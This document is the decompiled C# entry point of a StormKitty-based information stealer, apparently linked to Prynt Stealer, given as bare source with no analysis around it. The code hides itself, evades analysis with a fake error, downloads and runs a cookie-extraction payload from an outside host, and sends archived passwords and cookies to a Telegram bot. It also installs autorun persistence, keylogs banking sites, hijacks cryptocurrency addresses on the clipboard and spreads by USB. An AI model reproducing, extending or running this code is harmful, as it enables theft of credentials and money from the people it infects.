using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Stealer;
using StormKitty.Implant;
using StormKitty.Telegram;

namespace StormKitty
{
	// Token: 0x02000051 RID: 81
	internal class Program
	{
		// Token: 0x0600015D RID: 349 RVA: 0x0000BFB8 File Offset: 0x0000A1B8
		[STAThread]
		private static void Main(string[] args)
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 9999;
			MutexControl.Check();
			if (!Startup.IsFromStartup())
			{
				Startup.HideFile(null);
			}
			if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
			{
				SelfDestruct.Melt();
			}
			if (Config.StartDelay == "1")
			{
				StartDelay.Run();
			}
			if (AntiAnalysis.Run())
			{
				AntiAnalysis.FakeErrorMessage();
			}
			Directory.SetCurrentDirectory(Paths.lappdata);
			if (!Libs.LoadRemoteLibrary(Libs.ZipLib))
			{
				AntiAnalysis.FakeErrorMessage();
			}
			Config.Init();
			if (!StormKitty.Telegram.Report.TokenIsValid())
			{
				SelfDestruct.Melt();
			}
			string text = Filemanager.CreateArchive(Passwords.Save(), true);
			WebClient webClient = new WebClient();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			webClient.DownloadFile("https://pryntstealer.com/cookie/Cookies-Extract.zip", folderPath + "/Cookies.zip");
			Program.RunPS("Expand-Archive -Path $ENV:APPDATA/Cookies.zip -DestinationPath $ENV:APPDATA -Force -Verbose");
			Thread.Sleep(1000);
			Directory.SetCurrentDirectory(folderPath + "/Cookies-Extract");
			Program.ExecuteCommand("start recovery.exe");
			if (Program.checkChromeInstalled())
			{
				for (int i = 0; i < 21; i++)
				{
					Thread.Sleep(1000);
					Directory.SetCurrentDirectory(folderPath + "/Cookies-Extract");
					Program.ExecuteCommand("start recovery.exe");
				}
			}
			Thread.Sleep(5000);
			Console.WriteLine(text);
			StormKitty.Telegram.Report.SendReport(text);
			if (!File.Exists(folderPath + "/Cookies-Extract/Cookies_Network" + Environment.UserName + ".txt"))
			{
				return;
			}
			StormKitty.Telegram.Report.sendFile(folderPath + "/Cookies-Extract/Cookies_Network" + Environment.UserName + ".txt", "Document");
			File.Delete(text);
			File.Delete(folderPath + "/Cookies.zip");
			if (Config.Autorun == "1" && !Startup.IsInstalled() && !Startup.IsFromStartup())
			{
				Startup.Install();
			}
			if (Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1")
			{
				Console.WriteLine("Starting keylogger modules...");
				Thread mainThread = WindowManager.MainThread;
				mainThread.SetApartmentState(ApartmentState.STA);
				mainThread.Start();
			}
			if (!(Config.ClipperModule == "1") || !(Config.Autorun == "1"))
			{
				return;
			}
			new Thread(delegate()
			{
				Program.GetUSB();
			}).Start();
			for (;;)
			{
				Etherium.GetEtheriumWhile();
				LiteCoin.GetLiteCoinWhile();
				Monero.GetMoneroWhile();
				Bitcoin.Clip(Config.btc);
				Thread.Sleep(500);
			}
		}

		// Token: 0x0600015E RID: 350 RVA: 0x0000C23C File Offset: 0x0000A43C
		public static void GetUSB()
		{
			if (Config.usbspread == "1")
			{
				USBInstaller.GetUSB();
			}
		}

		// Token: 0x0600015F RID: 351 RVA: 0x0000C254 File Offset: 0x0000A454
		private static void RunPS(string args)
		{
			new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = args,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			}.Start();
		}

		// Token: 0x06000160 RID: 352 RVA: 0x0000C28C File Offset: 0x0000A48C
		private static void ExecuteCommand(string command)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			string text = process.StandardOutput.ReadToEnd();
			string text2 = process.StandardError.ReadToEnd();
			int exitCode = process.ExitCode;
			Console.WriteLine("output>>" + (string.IsNullOrEmpty(text) ? "(none)" : text));
			Console.WriteLine("error>>" + (string.IsNullOrEmpty(text2) ? "(none)" : text2));
			Console.WriteLine("ExitCode: " + exitCode.ToString(), "ExecuteCommand");
			process.Close();
		}

		// Token: 0x06000161 RID: 353 RVA: 0x0000C354 File Offset: 0x0000A554
		private static bool checkChromeInstalled()
		{
			bool result;
			try
			{
				string fileName = "chrome.exe";
				string arguments = "--no-startup-window --start-in-incognito";
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = fileName,
					Arguments = arguments
				});
				if (process != null)
				{
					process.Kill();
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
